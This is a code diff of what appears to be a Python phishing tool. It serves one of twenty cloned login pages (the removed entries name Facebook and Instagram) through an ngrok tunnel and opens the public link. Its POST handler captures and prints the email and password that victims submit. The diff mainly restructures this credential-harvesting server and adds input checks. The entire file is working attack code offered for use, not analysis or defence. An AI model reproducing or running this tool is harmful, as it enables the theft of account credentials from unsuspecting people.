@@ -8,75 +8,35 @@ from http.server import BaseHTTPRequestHandler, HTTPServer
 from http import HTTPStatus
 import urllib.parse
 
-
 options = {
-    "01": "htdocs/01.facebook.html",
-    "02": "htdocs/02.instagram.html",
-    # Add other options here for 03 to 20
+    "01": "htdocs/01.html",
+    "02": "htdocs/02.html",
+    "03": "htdocs/03.html",
+    "04": "htdocs/04.html",
+    "05": "htdocs/05.html",
+    "06": "htdocs/06.html",
+    "07": "htdocs/07.html",
+    "08": "htdocs/08.html",
+    "09": "htdocs/09.html",
+    "10": "htdocs/10.html",
+    "11": "htdocs/11.html",
+    "12": "htdocs/12.html",
+    "13": "htdocs/13.html",
+    "14": "htdocs/14.html",
+    "15": "htdocs/15.html",
+    "16": "htdocs/16.html",
+    "17": "htdocs/17.html",
+    "18": "htdocs/18.html",
+    "19": "htdocs/19.html",
+    "20": "htdocs/20.html",
+
 }
-
-class FormRequestHandler(BaseHTTPRequestHandler):
-    def do_GET(self):
-        if self.path == "/":
-            # Serve the root page (index.html)
-            self.send_response(HTTPStatus.OK)
-            self.send_header('Content-type', 'text/html')
-            self.end_headers()
-            with open(os.path.join(".", "htdocs/index.html"), 'rb') as file:
-                self.wfile.write(file.read())
-        elif self.path.startswith("/htdocs"):
-            # Serve the website content for files in the htdocs directory
-            try:
-                with open(os.path.join(".", self.path[1:]), 'rb') as file:
-                    if self.path.endswith(".woff"):
-                        self.send_response(HTTPStatus.OK)
-                        self.send_header('Content-type', 'font/woff')
-                    else:
-                        self.send_response(HTTPStatus.OK)
-                        self.send_header('Content-type', 'application/octet-stream')
-                    self.end_headers()
-                    self.wfile.write(file.read())
-            except FileNotFoundError:
-                self.send_response(HTTPStatus.NOT_FOUND)
-                self.end_headers()
-        else:
-            self.send_response(HTTPStatus.NOT_IMPLEMENTED)
-            self.end_headers()
-    def do_POST(self):
-        content_length = int(self.headers['Content-Length'])
-        form_data = self.rfile.read(content_length).decode('utf-8')
-        form_data = urllib.parse.parse_qs(form_data)
-
-        # Extract email and password from the form data
-        email = form_data.get('email', [''])[0]
-        password = form_data.get('pass', [''])[0]
-
-        print("Email:", email)
-        print("Password:", password)
-
-        self.send_response(HTTPStatus.OK)
-        self.send_header('Content-type', 'text/html')
-        self.end_headers()
-
-        response_content = "<h1>Form Submitted Successfully!</h1>"
-        self.wfile.write(response_content.encode('utf-8'))
 
 def clear_screen():
     if os.name == 'nt':  # Windows
         os.system('cls')
     else:  # Unix (Linux/Mac)
         os.system('clear')
-
-def run_http_server(directory, python_executable):
-    # Using FormRequestHandler as the handler for the server
-    handler_class = FormRequestHandler
-    server_address = ("", 8080)
-
-    try:
-        httpd = HTTPServer(server_address, handler_class)
-        httpd.serve_forever()
-    except KeyboardInterrupt:
-        httpd.server_close()
 
 def find_python_executable():
     try:
@@ -140,7 +100,6 @@ def get_user_token():
         else:
             print("Token cannot be empty. Please try again.")
 
-
 def main():
     title()
 
@@ -177,13 +136,19 @@ def main():
             title()
         elif user_input in options:
             filename = options[user_input]
+
+            # Check if the selected file exists
+            if not os.path.exists(filename):
+                print("The selected file does not exist. Please check your input and try again.")
+                continue
+
             # Using pyngrok to serve the selected file as localhost
             public_url = ngrok.connect(addr="8080", proto="http", bind_tls=True)
 
             try:
                 # Get the public URL from the NgrokTunnel object
                 ngrok_url = public_url.public_url
-                local_url = f"http://localhost:80/{filename}"
+                local_url = f"http://localhost:8080/"
 
                 print(f"Local URL: {local_url}")
                 print(f"Ngrok URL: {ngrok_url}")
@@ -192,12 +157,56 @@ def main():
                 webbrowser.open(ngrok_url)
 
                 # Launch a local server to serve the selected file using Python's built-in HTTP server
-                run_http_server(os.path.dirname(filename), python_executable)
+                def run_custom_http_server(directory, python_executable):
+                    class CustomRequestHandler(BaseHTTPRequestHandler):
+                        def do_GET(self):
+                            if self.path == "/":
+                                self.send_response(HTTPStatus.OK)
+                                self.send_header('Content-type', 'text/html')
+                                self.end_headers()
+                                with open(os.path.join(".", filename), 'rb') as file:
+                                    self.wfile.write(file.read())
+                            else:
+                                self.send_response(HTTPStatus.NOT_FOUND)
+                                self.end_headers()
+
+                        def do_POST(self):
+                            if self.path == "/":
+                                content_length = int(self.headers['Content-Length'])
+                                form_data = self.rfile.read(content_length).decode('utf-8')
+                                form_data = urllib.parse.parse_qs(form_data)
+
+                                # Extract email and password from the form data
+                                email = form_data.get('email', [''])[0]
+                                password = form_data.get('pass', [''])[0]
+
+                                print("Email:", email)
+                                print("Password:", password)
+
+                                self.send_response(HTTPStatus.OK)
+                                self.send_header('Content-type', 'text/html')
+                                self.end_headers()
+
+                                response_content = "<h1>Form Submitted Successfully!</h1>"
+                                self.wfile.write(response_content.encode('utf-8'))
+                            else:
+                                self.send_response(HTTPStatus.NOT_FOUND)
+                                self.end_headers()
+
+                    server_address = ("", 8080)
+                    httpd = HTTPServer(server_address, CustomRequestHandler)
+                    httpd.serve_forever()
+
+                run_custom_http_server(os.path.dirname(filename), python_executable)
+
             except AttributeError:
                 print("Failed to start tunnel. Please try again.")
             finally:
                 # Terminate the ngrok tunnel when done
                 ngrok.disconnect(public_url)
+
+        else:
+            print("Invalid input. Please try again.")
 
 if __name__ == "__main__":
     try:
@@ -205,4 +214,5 @@ if __name__ == "__main__":
     except KeyboardInterrupt:
         print("\nExiting .Phishing.")
     finally:
+        # Terminate ngrok when the script exits
         ngrok.kill()
